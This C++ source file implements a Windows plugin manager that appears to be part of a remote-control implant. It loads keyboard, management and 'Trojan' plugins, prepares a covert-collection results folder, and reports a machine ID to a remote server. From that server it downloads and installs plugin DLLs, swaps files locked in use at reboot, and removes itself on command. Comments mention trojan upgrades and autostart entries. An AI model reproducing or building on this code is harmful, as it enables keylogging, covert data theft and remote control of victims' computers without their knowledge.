/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief 插件管理实现部分
* @author 刘成伟 chengwei@run.com
* @date 2013-07-31
* @version 1.0
* @note 
*************************************************************************/

#include "ddc_util.h"
#include "algorithm"

#include <iphlpapi.h>
#include <ntddndis.h>
#pragma comment(lib,"IPHLPAPI.lib")

#include "PluginServer.h"
#include "../ClientSocket.h"
#include "Log.h"
#include "MD5.h"
#include "crc32.h"

/// 需要移动到公共目录下，判断目录是否存在
static bool dir_exists(const char *dir)
{
	if( strlen(dir)==2 && dir[1]==':')
		return true;

	DWORD dwAttr = GetFileAttributes(dir );
	if( dwAttr == -1 )
		return false;
	return (dwAttr&FILE_ATTRIBUTE_DIRECTORY)!=0;	
}

/// 需要移动到公共目录下，递归创建目录
static int RecurseCreateDirectory(const char *dir)
{	
	if( dir[0] == 0 )
		return DDCE_ARGUMENT_ERROR;

	DDC_BOOL_RETURN( dir_exists(dir),DDCE_SUCCESS );		

	char dirFather[MAX_PATH*2];
	strncpy(dirFather,dir,MAX_PATH*2);
	char *p = strrchr(dirFather,DDC_C_SLASH);
	if( p )
		*p = 0;

	while( !dir_exists(dirFather) )
	{		
		int ret = RecurseCreateDirectory(dirFather);
		if( ret != 0 )
			return ret;
	}

	//目录结尾不带"\\"
	if( dir[strlen(dir)-1] != DDC_C_SLASH )	
		return CreateDirectory(dir,NULL)==TRUE?0:DDCE_DISK_OP_ERROR;

	return 0;
}

/// 需要移动到公共目录，拷贝文件，没有目录就创建目录
static int ComfirmCopyFile(const char *src,const char *desc)
{
	char szDir[MAX_PATH] = {0};
	strncpy(szDir,desc,MAX_PATH);
	char *p = strrchr(szDir,'\\');
	if(p)
		*(p+1) = 0;
	RecurseCreateDirectory(szDir);

	return ::CopyFile(src,desc,FALSE)?0:DDCE_DISK_OP_ERROR;

}


// 取自用的机器标识符,until.cpp中
extern LPSTR GetTSPMachineID(LPSTR szCPUID);

///////////////////////////////////////////////////////////
// 初始化singleton
#ifdef _MSC_VER
CPlugServer* SingletonHolder<CPlugServer>::pInstance_ = 0;
#endif

CPlugServer::CPlugServer( CClientSocket *_sock)
{
	m_sock = _sock;
	m_err = 0;

	//得到安装路径
	GetModuleFileName(NULL,m_szModulePath,TSP_PLUGIN_PATH);
	DDC_RIGHT_SLASH(m_szModulePath);
	
	//插件目录初始化
	m_szPluginConfigPath.assign(m_szModulePath);
	m_szPluginConfigPath += TSP_PLUGIN_S_CONFIG_PATH;

	//插件下载目录初始化
	// update path to temp by menglz
	
	//m_szPluginDownLoadPath.assign(m_szModulePath);


	char chTempPath[MAX_PATH+1] = {0};

	GetTempPathA(MAX_PATH,chTempPath);

	m_szPluginDownLoadPath.assign(chTempPath);

	m_szPluginDownLoadPath += TSP_PLUGIN_S_DOWNLOAD_PATH;

	//密取目录初始化
	//std::string str(m_szModulePath);
	//str += TSP_PLUGIN_S_MQ_PATH;
	
	std::string str(m_szModulePath,1);

	str += TSP_PLUGIN_S_MQ_PATH;  // modify by menglz

	::CreateDirectory(str.c_str(),NULL);
	strncpy(m_plugParam.imp.chResultPath,str.c_str(),MAX_PATH);

	//机器ID初始化
	char szCPUID[TSP_PLUGIN_SHORT_PATH];
	GetTSPMachineID(szCPUID);
	m_plugParam.dwMachineID = crc32((uchar*)szCPUID,strlen(szCPUID));

	// 初始化插件列表,顺序不能乱
	m_PluginList.push_back(new CKeyBoardPlug);
	m_PluginList.push_back(new CManagePlug);
	m_PluginList.push_back(new CTrojanPlug);
	
	
	// 检测一下
	for( vector<CPlugServerInfo *>::const_iterator iter=m_PluginList.begin();iter!=m_PluginList.end();++iter )
		if( NULL == (*iter) )
		{
			LOG((LEVEL_ERROR,"Memory Alloc Error.\n"));
			//构造函数中，没法处理，后面马上会崩掉
		}
	

	// 加载默认数据
	int ret = ReloadPlugin(0);
	if( 0 != ret )
	{
		LOG((LEVEL_WARNNING,"Plugin Init Failed.\n"));
	}

	
}

CPlugServer::~CPlugServer()
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::~CPlugServer \n"));

	// 停止所有插件
	StatusAll(CPlugServerInfo::STATUS_UNLOAD);

	// 删除插件列表
	std::vector<CPlugServerInfo *>::const_iterator iter=m_PluginList.begin();
	for( ;iter!=m_PluginList.end();++iter )	
		delete (*iter);
	
	m_PluginList.clear();
}


BOOL CPlugServer::StartSrv()
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::StartService \n"));
	int ret;
	m_err = 0;
	if( !m_sock )
	{
		LOG((LEVEL_ERROR,"没有初始化socket \n"));
		return FALSE;
	}

	// 第一个参数不需要,下载是异步的，文件名各自组装
	if( !DownloadConfig(NULL) )
	{
		LOG((LEVEL_ERROR,"下载config文件失败 \n"));

		//启用默认插件		
		ret = StatusAll(CPlugServerInfo::STATUS_RUNNING);
		if( 0 != ret )
			LOG((LEVEL_WARNNING,"启用插见失败,ret=%d(%x).\n",ret,ret));
		
		return FALSE;
	}

	//由于下载是异步的，等待下载结束
	ret = m_hEvent.wait( CPlugServer::WAIT_TIME );
	
	
	//判断超时或者其他错误原因
	if( m_err || ret == DDCE_TIMEOUT )
	{
		LOG((LEVEL_INFO,"下载配置文件失败或者超时，启用以前的配置. \n"));

		//启用默认插件		
		ret = StatusAll(CPlugServerInfo::STATUS_RUNNING);
		if( 0 != ret )
			LOG((LEVEL_WARNNING,"启用插见失败,ret=%d(%x).\n",ret,ret));
		
		return FALSE;
	}

	return TRUE;
}



//解析插件配置文件，下载并装载
BOOL CPlugServer::ProcessConfig()
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::ProcessConfig\n"));

	char md5[33] = {0};
	BOOL bRet = FALSE;
	int ret;

	// 组装下载后的插件配置文件名
	std::string strPluginDownLoadFile(m_szPluginDownLoadPath);
	strPluginDownLoadFile += TSP_PLUGIN_S_CONFIG_DLNAME;
	
	// 组装插件配置文件文件名
	std::string strPluginConfigFile(m_szPluginConfigPath);
	strPluginConfigFile += TSP_PLUGIN_S_CONFIG_NAME;

	std::string strPluginDownLoadTmpFile;

	// 锁住这个链表，由于网络IO是异步，这个操作需要同步
	nm_ddc::CLockGuard<nm_ddc::CThreadMutex> guard(&m_lock);	

	// 读取配置信息到临时链表中
	std::list<CPlugServerInfo> l;
	if( !ReadPluginIniFile<CPlugServerInfo>(l,strPluginDownLoadFile,true) )	
	{
		LOG((LEVEL_WARNNING,"解析插件配置文件失败.%s\n",strPluginDownLoadFile.c_str()));
		return FALSE;
	}

	// 遍历新列表
	for( std::list<CPlugServerInfo>::iterator iter=l.begin();iter!=l.end();++iter )
	{
		// 只处理自己能处理的
		int nIndex = PidToIndex(iter->m_pid);
		if( nIndex == -1 )
			continue;

		if( m_PluginList[nIndex]->GetStatus() == CPlugServerInfo::STATUS_DELETE ||
			 m_PluginList[nIndex]->GetStatus() == CPlugServerInfo::STATUS_ERROR )
		{
			// 异常状态，需要下载升级
		}
		else	  
		{
			// 找到先做一次自我检测，防止配置文件和实体文件不一致导致不更新
			bRet = MD5_Caculate_File ( m_PluginList[nIndex]->m_strFullName.c_str(),md5);

			// 比较md5值和文件路径,不处理移动位置问题了，太复杂，直接走下载删除流程
			//if( bRet && strncmp(iter->m_md5,m_PluginList[nIndex]->m_md5,32) == 0 && m_PluginList[nIndex]->m_strFullName == iter->m_strFullName )
			//update by menglz 20131209
			if( bRet && strncmp(iter->m_md5,md5,32) == 0 && m_PluginList[nIndex]->m_strFullName == iter->m_strFullName )
			{
				// 插件在列表中必须有个位置，所以初始状态都为INIT包含两种情况：1.配置文件没有；2.配置文件有，对于第二种，由于比较了文件名，
				// 肯定有内容，这里设置为UNLOAD状态，后面能加载
				if( m_PluginList[nIndex]->GetStatus() == CPlugServerInfo::STATUS_INIT )
				{
					m_PluginList[nIndex]->Status(CPlugServerInfo::STATUS_UNLOAD);
					m_PluginList[nIndex]->LoadPlug(0);
				}				
				continue;
			}
		}
		

		// 准备下载
		iter->m_status = CPlugServerInfo::STATUS_WAITDOWNLOAD;
	}	

	// 下载
	for_each( l.begin(),l.end(),bind2nd(mem_fun_ref(&CPlugServerInfo::DownloadPlug),m_szPluginDownLoadPath) );

	std::list<CPlugServerInfo>::iterator iter;

	// 根据下载情况，改记录
	for( iter=l.begin();iter!=l.end();++iter )
	{
		if( iter->m_status == CPlugServerInfo::STATUS_DOWNLOAD )
		{
			int nIndex = PidToIndex(iter->m_pid);
			if( nIndex == -1 )
			{
				LOG((LEVEL_WARNNING,"下载成功的PID未找到索引:%d\n",iter->m_pid));
				continue;
			}
			
			// 组装下载文件名
			strPluginDownLoadTmpFile.assign(m_szPluginDownLoadPath);
			strPluginDownLoadTmpFile += iter->m_strName;

			//先加入回收站
			m_recycle.Push(strPluginDownLoadTmpFile);
			
				
			// 不处理木马升级，改变路径需要改变自启动项
			if( nIndex == PLUG_ARRAY_NO_MANAGE )
			{
				// 卸载TSPDll
				ret = m_PluginList[nIndex]->UnLoadPlug(0);
				if( ret != 0 )
				{
					LOG((LEVEL_WARNNING,"升级插件 %s 出错:%d(%x)\n",iter->m_strName.c_str(),ret,ret));
				}
			}
			
			// 停用，删除
			ret = m_PluginList[nIndex]->RemovePlug(0);			 
			if( ret != 0 )
			{
				LOG((LEVEL_WARNNING,"卸载插件 %s 出错:%d(%x)\n",iter->m_strName.c_str(),ret,ret));
			}
						
			//将插件文件拷贝到目的地
			ret = ComfirmCopyFile(strPluginDownLoadTmpFile.c_str(),iter->m_strFullName.c_str());					
			if( ret != 0 )
			{
				LOG((LEVEL_ERROR,"拷贝文件出错:(%s==>%s),Lasterror=%d\n",strPluginDownLoadTmpFile.c_str(),iter->m_strFullName.c_str(),GetLastError()));
			}

			// 路径相同，并且是木马或者键盘插件，删不掉
			if( m_PluginList[nIndex]->m_strFullName == iter->m_strFullName &&
				(nIndex == PLUG_ARRAY_NO_KEYBOARD || nIndex == PLUG_ARRAY_NO_TROJAN ) )
			{
				// 这两种换不掉，调用Update()更新,Update函数会拷贝个副本，调用MoveFileEx,等待机器重启
				ret = m_PluginList[nIndex]->UpdatePlug(0,strPluginDownLoadTmpFile,&m_plugParam);
				if( ret != 0 )
				{
					LOG((LEVEL_WARNNING,"升级插件 %s 出错:%d(%x)\n",iter->m_strName.c_str(),ret,ret));
				}
			}

			// 拷贝配置文件到目的地
			m_PluginList[nIndex]->UpdatePlug(CPlugServerInfo::UPDATE_CFG,iter->m_strFullName,&m_plugParam);
			
			iter->m_strURL = "";

			// 赋值，保留状态			
			*m_PluginList[nIndex] = *iter;
			m_PluginList[nIndex]->m_status = CPlugServerInfo::STATUS_UNLOAD;
		}
	}


	// 根据新配置写加密ini文件
	if( !WritePluginIniFile(l,strPluginConfigFile,true) )
	{
		LOG((LEVEL_ERROR,"写配置文件错:%s",strPluginConfigFile.c_str()));
	}
	
	// 处理键盘插件停用
	if( find(l.begin(),l.end(),m_PluginList[PLUG_ARRAY_NO_KEYBOARD]->m_strName.c_str() ) == l.end() )
		m_PluginList[PLUG_ARRAY_NO_KEYBOARD]->RemovePlug(0);

	// 如果TSPPlug状态为初始化，改为Unload,配制中必须有此项
	if( m_PluginList[PLUG_ARRAY_NO_MANAGE]->GetStatus() == CPlugServerInfo::STATUS_INIT &&
		 m_PluginList[PLUG_ARRAY_NO_MANAGE]->m_strFullName != "" )
		m_PluginList[PLUG_ARRAY_NO_MANAGE]->Status(CPlugServerInfo::STATUS_UNLOAD );

	// 启用
	StatusAll(CPlugServerInfo::STATUS_RUNNING);	

	if( find(l.begin(),l.end(),m_PluginList[PLUG_ARRAY_NO_MANAGE]->m_strName.c_str() ) == l.end() )
	{
		// 管理插件被停用，删除一切子插件
		LOG((LEVEL_INFO,"管理插件停用，删除子插件\n"));
		ret = m_PluginList[PLUG_ARRAY_NO_MANAGE]->RemovePlug(CPlugServerInfo::UPDATE_DLL);
		if( ret != 0 )
			LOG((LEVEL_ERROR,"TSPPlug 更新失败.\n"));		

		// 卸载自身
		ret = m_PluginList[PLUG_ARRAY_NO_MANAGE]->RemovePlug(0);
		if( ret != 0 )
			LOG((LEVEL_ERROR,"TSPPlug 更新失败.\n"));		
	}
	else
	{
		// 通知TSPPlug去更新
		LOG((LEVEL_INFO,"通知Manager插件更新:%s\n",strPluginDownLoadFile.c_str()));
		ret = m_PluginList[PLUG_ARRAY_NO_MANAGE]->UpdatePlug(CPlugServerInfo::UPDATE_DLL,strPluginDownLoadFile,&m_plugParam);
		if( ret != 0 )
			LOG((LEVEL_ERROR,"TSPPlug 更新失败.\n"));		
	}
	

	// list中要析构，改该状态
	for_each(l.begin(),l.end(),bind2nd(mem_fun_ref(&CPlugServerInfo::Status),CPlugServerInfo::STATUS_INIT));	

	// 清理现场
	m_recycle.PopAll();

	return TRUE;
}

// 配置文件下载,由于是异步的，这里只是发送个请求命令
BOOL CPlugServer::DownloadConfig(const TCHAR *szSaveName)
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::DownloadConfig\n"));

	//发送插件下载请求
	BYTE bToken = TOKEN_PLUGIN_REQUEST;

	char szCPUID[TSP_PLUGIN_SHORT_PATH];
	GetTSPMachineID(szCPUID);
	
	CBuffer buff;
	buff.Write(&bToken,sizeof(BYTE));
	if( !buff.Write( (LPBYTE)szCPUID,50) )
	{
		LOG((LEVEL_ERROR,"buff中写数据失败\n"));
		return FALSE;
	}
	

	
	//Sleep(1000);  //by menglz

	m_sock->Send(buff.GetBuffer(),buff.GetBufferLen());
	

	return TRUE;
}

// 处理插件下载命令
int CPlugServer::OnPluginRequest(void *lpBuffer,uint nBufLen)
{		
	//创建目录
	DWORD dwAttr = GetFileAttributes(m_szPluginDownLoadPath.c_str() );
	if( dwAttr == -1 || (dwAttr&FILE_ATTRIBUTE_DIRECTORY) == 0 )
		if( !CreateDirectory(m_szPluginDownLoadPath.c_str(),NULL) )
		{ LOG((LEVEL_WARNNING,"创建目录失败:%s 错误码:%d(%x).\n",m_szPluginDownLoadPath.c_str(),GetLastError(),GetLastError())); }
		else
			m_recycle.Push(m_szPluginDownLoadPath,CTspRecycle::FLAG_DIR);		//目录名加入回收站



	// 组装下载的配置文件名
	std::string strPluginDownloadFile(m_szPluginDownLoadPath);
	strPluginDownloadFile += TSP_PLUGIN_S_CONFIG_DLNAME;
	/*
	// 写入文件
	std::ofstream ofile;
	ofile.open(strPluginDownloadFile.c_str(),ios::trunc|ios::out|ios::binary);
	if( !ofile )
	{
		LOG((LEVEL_ERROR,"打开文件失败:%s.\n",strPluginDownloadFile.c_str()));
		m_err = DDCE_OPEN_FILE_ERROR;
		RETURN( DDCE_OPEN_FILE_ERROR );
	}
	else
		m_recycle.Push(strPluginDownloadFile);		//加入回收站

	ofile.write( (const char *)lpBuffer,nBufLen);
	ofile.close();
	*/


	FILE *fp = fopen(strPluginDownloadFile.c_str(),"wb");
	if( !fp )
	{
		LOG((LEVEL_ERROR,"打开文件失败:%s.\n",strPluginDownloadFile.c_str()));
		m_err = DDCE_OPEN_FILE_ERROR;
		RETURN( DDCE_OPEN_FILE_ERROR );
	}
	else
		m_recycle.Push(strPluginDownloadFile);		//加入回收站

	if (0  == (IsBadReadPtr(lpBuffer,nBufLen)))  //zhenyu 20140916 防止指针被改
	{
		fwrite( lpBuffer,nBufLen,1,fp);
	}
	
	fclose(fp);

	//通知执行线程继续
	m_err = 0;
	m_hEvent.signal();
	
	return 0;
}

// 处理插件卸载命令
int CPlugServer::OnPluginRemove(void *lpBuffer,uint nBufLen)
{
	// 通知TSPPlug卸载插件
	m_PluginList[PLUG_ARRAY_NO_MANAGE]->RemovePlug(1);

	//需要回复一个应答包，否则服务器不会认为卸载掉了
	BYTE bToken = TOKEN_REPLY_REMOVE;			
	m_sock->Send((LPBYTE)&bToken, sizeof(bToken));
	

	// 等待TSPPlug卸载
	Sleep(1000);

	// 卸载自己的模块
	std::vector<CPlugServerInfo *>::const_iterator iter=m_PluginList.begin();
	for( ;iter!=m_PluginList.end();++iter )	
		(*iter)->RemovePlug(0);

	return 0;
}


// 从配置文件重新生成插件列表
int CPlugServer::ReloadPlugin(DWORD dwFlag)
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServer::ReloadPlugin,flag = %d\n",dwFlag));	
	
	// 重新从配置文件读
	std::string strPluginConfigFile(m_szPluginConfigPath);
	strPluginConfigFile += TSP_PLUGIN_S_CONFIG_NAME;
	
	std::list<CPlugServerInfo> l;
	// 如果配置文件不正确，由于下载模块很可能调用此函数，所以不返回错，这样可以通过升级更新到新的
	if( !ReadPluginIniFile<CPlugServerInfo>(l,strPluginConfigFile,true) )
	{
		LOG((LEVEL_ERROR,"读取插件配置文件错"));
		return DDCE_READ_FILE_ERROR;
	}
	
	// 只拷贝自己能处理的3种插件，并且设置初始状态
	for( std::list<CPlugServerInfo>::const_iterator iter=l.begin();iter!=l.end();++iter )
	{
		if( iter->m_pid == TSP_PLUGIN_REMOVE_PID )
			*m_PluginList[PLUG_ARRAY_NO_TROJAN] = *iter;
		else if( iter->m_pid == TSP_PLUGIN_MANAGE )
			*m_PluginList[PLUG_ARRAY_NO_MANAGE] = *iter;
		else if( iter->m_pid == TSP_PLUGIN_KEYBOARD )
			*m_PluginList[PLUG_ARRAY_NO_KEYBOARD] = *iter;		
	}
	
	// 设置初始状态
	for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::Status),CPlugServerInfo::STATUS_INIT));

	return 0;
}

//改变插件状态
int CPlugServer::Status(int pid,int flag)
{
	int ret;

	// 遍历链表
	std::vector<CPlugServerInfo *>::iterator iter=m_PluginList.begin();
	for( ;iter!=m_PluginList.end();++iter )	
		if( (*iter)->m_pid == pid )
		{
			if( flag == CPlugServerInfo::STATUS_RUNNING )
				ret = (*iter)->StartPlug(&m_plugParam);
			else if( flag == CPlugServerInfo::STATUS_UNLOAD )
				ret = (*iter)->UnLoadPlug(0);					
			else if( flag == CPlugServerInfo::STATUS_LOAD )
				ret = (*iter)->LoadPlug(0);					
			else if( flag == CPlugServerInfo::STATUS_STOP )
				ret = (*iter)->StopPlug(0);					
			else if( flag == CPlugServerInfo::STATUS_DELETE )
				ret = (*iter)->RemovePlug(0);	
			return ret;
		}
	
	LOG((LEVEL_WARNNING,"插件类型未找到:%d\n",pid));
	return CPlugServerInfo::STATUS_ERROR;	
}

//获得插件状态
int CPlugServer::Status(int pid)
{
	// 遍历链表
	std::vector<CPlugServerInfo *>::const_iterator iter=m_PluginList.begin();
	for( ;iter!=m_PluginList.end();++iter )	
		if( (*iter)->m_pid == pid )
			return (*iter)->m_status;
	
	LOG((LEVEL_WARNNING,"插件类型未找到:%d\n",pid));
	return CPlugServerInfo::STATUS_ERROR;
}

//改变所有插件状态
int CPlugServer::StatusAll(int flag)
{
	if( flag == CPlugServerInfo::STATUS_RUNNING )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::StartPlug),&m_plugParam));	
	else if( flag == CPlugServerInfo::STATUS_UNLOAD )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::UnLoadPlug),0));
	else if( flag == CPlugServerInfo::STATUS_LOAD )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::LoadPlug),0));
	else if( flag == CPlugServerInfo::STATUS_STOP )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::StopPlug),0));
	else if( flag == CPlugServerInfo::STATUS_DELETE )
		for_each(m_PluginList.begin(),m_PluginList.end(),bind2nd(mem_fun(&CPlugServerInfo::RemovePlug),0));
	else
	{
		  LOG((LEVEL_WARNNING,"插件状态未找到:%d\n",flag));
	}
	
	return 0;
}

// 转pid到对应的数组索引
int CPlugServer::PidToIndex(int pid)
{
	// 数组编号初始化时固定死，不能动，参考构造函数
	if( pid == TSP_PLUGIN_REMOVE_PID )
		return PLUG_ARRAY_NO_TROJAN;
	else if( pid == TSP_PLUGIN_MANAGE )
		return PLUG_ARRAY_NO_MANAGE;
	else if( pid == TSP_PLUGIN_KEYBOARD )
		return PLUG_ARRAY_NO_KEYBOARD;
	return -1;
}

